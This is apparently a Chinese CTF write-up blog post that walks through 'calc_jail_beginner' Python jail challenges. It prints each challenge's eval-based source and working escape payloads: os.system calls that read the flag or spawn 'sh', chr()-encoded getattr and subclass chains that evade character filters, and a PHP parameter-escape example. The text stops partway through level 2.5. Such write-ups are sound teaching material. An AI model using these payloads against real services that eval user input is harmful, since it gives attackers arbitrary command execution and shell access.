<h2 id="åšé¢˜ç¯èŠ‚"><a href="#åšé¢˜ç¯èŠ‚" class="headerlink" title="åšé¢˜ç¯èŠ‚"></a>åšé¢˜ç¯èŠ‚</h2><h4 id="calc-jail-beginner"><a href="#calc-jail-beginner" class="headerlink" title="calc_jail_beginner"></a>calc_jail_beginner</h4><p>è¿›å…¥é¢˜ç›®</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531097.png?raw=true" alt="image-20240604183805679"></p>
<p>ç»™äº†ä¸ªé™„ä»¶ï¼Œä¸‹è½½çœ‹å‘ç°æ˜¯æºç </p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531031.png?raw=true" alt="image-20240604184350341"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#Your goal is to read ./flag.txt</span><br><span class="line">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _     ______      _                              _       _ _ </span><br><span class="line"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="line"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="line"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span><br><span class="line"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="line"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="line">               __/ |                                           </span><br><span class="line">              |___/                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å‰é¢å°±ç»™äº†paylod,ç›´æ¥ç”¨å°±è¡Œ</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531799.png?raw=true" alt="image-20240604184457273"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)</span><br><span class="line"></span><br><span class="line">print(open(&#x27;/flag.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531860.png?raw=true" alt="image-20240604185356962"></p>
<h4 id="calc-jail-beginner-level1"><a href="#calc-jail-beginner-level1" class="headerlink" title="calc_jail_beginner_level1"></a>calc_jail_beginner_level1</h4><p>è¿›å…¥é¢˜ç›®</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531303.png?raw=true" alt="image-20240604185535230"></p>
<p>é™„ä»¶ç»™çš„æºç é•¿è¿™ä¸ªæ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#the function of filter will banned some string &#x27;,&quot;,i,b</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`ib&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ __ </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | /_ |</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span><br><span class="line">              __/ |                          _/ |                                  </span><br><span class="line">             |___/                          |__/                                                                                      </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if filter(input_data):</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å®šä¹‰äº†ä¸€ä¸ªfilterï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¸èƒ½åŒ…å«åŒå¼•å·ã€å•å¼•å·ã€åå¼•å·ã€å­—æ¯<code>i</code>å’Œå­—æ¯<code>b</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰€ä»¥ï¼Œimport`ã€`__builtins__`ã€`bytesè¿™äº›å°±åœ¨è¿™ç”¨ä¸äº†äº†</span><br></pre></td></tr></table></figure>

<p>ç”±å¸¸è§„æ€è·¯æ¥è¿›è¡Œæ¨å¯¼</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">//è·å–å½“å‰ç±»â€”â€”&gt;è·å–å½“å‰ç±»çš„åŸºç±»â€”â€”&gt;è¿”å›å½“å‰ç±»çš„æ‰€æœ‰å­ç±»</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›ä¸€æ­¥æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getattr(().__class__, &#x27;__base__&#x27;).__subclasses__()</span><br><span class="line">//è·å–å½“å‰ç±»â€”â€”&gt;è·å–å½“å‰ç±»çš„åŸºç±»â€”â€”&gt;è¿”å›å½“å‰ç±»çš„æ‰€æœ‰å­ç±»â€”â€”&gt;è¿”å›å­ç±»åˆ—è¡¨</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¾ˆå¯æƒœçš„æ˜¯å•å¼•å·åŒå¼•å·å’Œå­—æ¯béƒ½è¢«banäº†</p>
<p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ASCIIğŸç»•è¿‡çš„æ–¹æ³•å°è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)</span><br><span class="line">//è¿™ä¸€ä¸²çš„å€¼ä¸º&#x27;_base_&#x27;</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥å°†è¿™ç©æ„æ›¿æ¢æ‰æˆ‘ä»¬å…ˆå‰å¸¦bçš„base</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªsubclassesï¼Œæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531058.png?raw=true" alt="image-20240604192406689"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">&gt; getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</span><br><span class="line">Answer: [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;symtable entry&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;anext_awaitable&#x27;&gt;, &lt;class &#x27;async_generator_asend&#x27;&gt;, &lt;class &#x27;async_generator_athrow&#x27;&gt;, &lt;class &#x27;async_generator_wrapped_value&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;weakref.CallableProxyType&#x27;&gt;, &lt;class &#x27;weakref.ProxyType&#x27;&gt;, &lt;class &#x27;weakref.ReferenceType&#x27;&gt;, &lt;class &#x27;types.UnionType&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;_contextvars.Context&#x27;&gt;, &lt;class &#x27;_contextvars.ContextVar&#x27;&gt;, &lt;class &#x27;_contextvars.Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¤åˆ¶æºç ä¸‹æ¥ï¼Œctrl+få¯¹osè¿›è¡Œæœç´¢ï¼Œå‘ç°&lt;class â€˜os._wrap_closeâ€™&gt;å¯èƒ½å¯ä»¥è¢«åˆ©ç”¨</p>
<p>&lt;class â€˜os._wrap_closeâ€™&gt;æ˜¯å€’æ•°ç¬¬å››ä¸ªç±»ï¼Œäºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥çš„åˆ©ç”¨å°±æ˜¯è¿™æ ·çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;)</span><br><span class="line">//åå°„è¿›å…¥åˆ°å€’æ•°ç¬¬å››ä¸ªè¿™ä¸ªç±»ï¼Œç„¶ååˆå§‹åŒ–å†ç”¨gloablså‡½æ•°è¿”å›å¯¹åº”ç±»é‡Œçš„å‡½æ•°ï¼Œæ¥ç€å°±æ˜¯è¿›å…¥shelläº¤äº’</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯ç»•è¿‡äº†ï¼Œä»¿ç…§ä¹‹å‰çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œ æ³¨æ„è¦æœ‰å››ä¸ªgetattrï¼Œå› ä¸ºä¸€å…±æ˜¯äº”ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå…¶ä¸­è¿™ä¸ªclassæ˜¯ä¸ç”¨ç»•è¿‡çš„ï¼Œæ‰€ä»¥ç”¨äº”ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531427.png?raw=true" alt="image-20240604193049200"></p>
<p>â€‹	å› ä¸ºevalå‡ºçš„ç»“æœæ˜¯æœ‰å›æ˜¾çš„ï¼Œä¹Ÿå¯ä»¥ç”¨ä¹‹å‰çš„å¦ä¸€ä¸ªpayloadæ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(chr(102)+chr(108)+chr(97)+chr(103)).read()</span><br></pre></td></tr></table></figure>



<h4 id="calc-jail-beginner-level2"><a href="#calc-jail-beginner-level2" class="headerlink" title="calc_jail_beginner_level2"></a>calc_jail_beginner_level2</h4><p>é¢˜ç›®ç»™çš„é™„ä»¶æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#the length is be limited less than 13</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ ___  </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | |__ \ </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span><br><span class="line">              __/ |                          _/ |                                    </span><br><span class="line">             |___/                          |__/                                                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(input_data)&gt;13:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬çš„payloadé•¿åº¦è¢«é™åˆ¶åœ¨äº†13ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•ç”¨å¾ˆé•¿çš„ç¼–ç ç»•è¿‡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(input_data)&gt;13:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„è§£æ³•å’Œä¹‹å‰RCEçš„å‚æ•°é€ƒé€¸æ˜¯ä¸€ä¸ªåŸç†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=system($_POST[1]);&amp;1=ls</span><br></pre></td></tr></table></figure>

<p>å¯¹æˆ‘ä»¬çš„cmdè¿›è¡Œé™åˆ¶ï¼Œå…³æˆ‘ä»¬1ä»€ä¹ˆäº‹ï¼Œåœ¨è¿™é¢˜å½“ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„åŸç†æ¥è¾¾åˆ°é€ƒé€¸çš„æ•ˆæœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(input())</span><br></pre></td></tr></table></figure>

<p>evalæ˜¯æœ‰å›æ˜¾çš„ï¼Œæˆ‘ä»¬åœ¨åé¢è¿™ä¸ªinputå½“ä¸­å°±èƒ½è¿›è¡Œrceäº†</p>
<p>å®Œæ•´payloadå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(input())</span><br><span class="line">__builtins__.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)//æ‰¾flag</span><br><span class="line">__builtins__.__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)//è¯»flag</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531218.png?raw=true" alt="image-20240604194111205"></p>
<h4 id="calc-jail-beginner-level2-5"><a href="#calc-jail-beginner-level2-5" class="headerlink" title="calc_jail_beginner_level2.5"></a>calc_jail_beginner_level2.5</h4><p>é™„ä»¶æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#the length is be limited less than 13</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#banned some unintend sol</span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    BLACKLIST = [&quot;exec&quot;,&quot;input&quot;,&quot;eval&quot;]</span><br><span class="line">    for i in BLACKLIST:</span><br><span class="line">        if i in s:</span><br><span class="line">            print(f&#x27;&#123;i!r&#125; has been banned for security reasons&#x27;)</span><br><span class="line">            exit(0)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _ _                _ ___    _____ </span><br><span class="line"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span><br><span class="line">              __/ |                          _/ |                                          </span><br><span class="line">             |___/                          |__/                                                                                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = 